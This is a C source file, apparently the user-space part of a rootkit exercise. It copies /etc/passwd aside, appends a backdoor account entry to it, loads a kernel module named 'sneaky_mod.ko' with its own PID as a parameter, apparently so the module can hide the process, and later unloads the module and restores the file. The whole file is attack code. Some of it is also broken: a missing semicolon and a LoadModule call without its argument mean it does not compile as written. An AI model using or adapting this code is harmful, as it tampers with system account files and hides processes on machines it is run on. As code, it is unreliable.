#include <stdio.h>
#include <stdlib.h>
#include <unistd.h> 
#include <sys/types.h>
#include <sys/wait.h>

const char* original_file = "/etc/passwd";
const char* temp_file = "/tmp/passwd";
const char* module_name = "sneaky_mod.ko"

void CopyFile(const char* src_file, const char* dst_file) {

	pid_t child_pid = fork();
	if (child_pid < 0) {
		perror("copy file fork error");
		exit(EXIT_FAILURE);
	} else if (child_pid == 0) {
		int execReturn = execl("/bin/cp", "cp", src_file, dst_file, (char*)0);
		if(execReturn == -1) {
			perror("copy file exec error");
			exit(EXIT_FAILURE);
		}
	} else {
		int wait_status;
		pid_t wait_pid = waitpid(child_pid, &wait_status, 0);
		if (wait_pid == -1) {
			perror("copy file waitpid error");
			exit(EXIT_FAILURE);
		}
	}
}

void AddLine(const char* file_name) {
	const char * line = "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n";
	FILE * pFile = fopen(file_name, "a");
	fputs (line,pFile);
	fclose (pFile);
}

void LoadModule(const char * module_name) {
	pid_t child_pid = fork();
	if (child_pid < 0) {
		perror("load module fork error");
		exit(EXIT_FAILURE);
	} else if (child_pid == 0) {
		pid_t ppid = getppid();
		char arg[40];
		sprintf(arg,"sneaky_process_id=%d", (int)ppid);

		int execReturn = execl("/sbin/insmod", "insmod", module_name, arg, (char*)0);
		if(execReturn == -1) {
			perror("load module exec error");
			exit(EXIT_FAILURE);
		}
	} else {
		int wait_status;
		pid_t wait_pid = waitpid(child_pid, &wait_status, 0);
		if (wait_pid == -1) {
			perror("load module waitpid error");
			exit(EXIT_FAILURE);
		}
	}

}

void UnloadModule(const char * module_name) {
	pid_t child_pid = fork();
	if (child_pid < 0) {
		perror("unload module fork error");
		exit(EXIT_FAILURE);
	} else if (child_pid == 0) {
		int execReturn = execl("/sbin/rmmod", "rmmod", module_name, 0);
		if(execReturn == -1) {
			perror("unload module exec error");
			exit(EXIT_FAILURE);
		}
	} else {
		int wait_status;
		pid_t wait_pid = waitpid(child_pid, &wait_status, 0);
		if (wait_pid == -1) {
			perror("unload module waitpid error");
			exit(EXIT_FAILURE);
		}
	}

}

int main () {
	//Print the PID of the attack process 
	printf("sneaky_process pid = %d\n", getpid());

	//Copy /etc/passwd to /tmp/passwd
	CopyFile(original_file, temp_file);

	//Add a line to /etc/passwd
	AddLine(original_file);

	//Load the kernel module
	LoadModule();

	//Wait for 'q'
	while (getchar() != 'q') {	
	}

	//Unload the module
	UnloadModule(module_name);

	//Restore the /etc/passwd
	CopyFile(temp_file, original_file);

	return EXIT_SUCCESS;
}
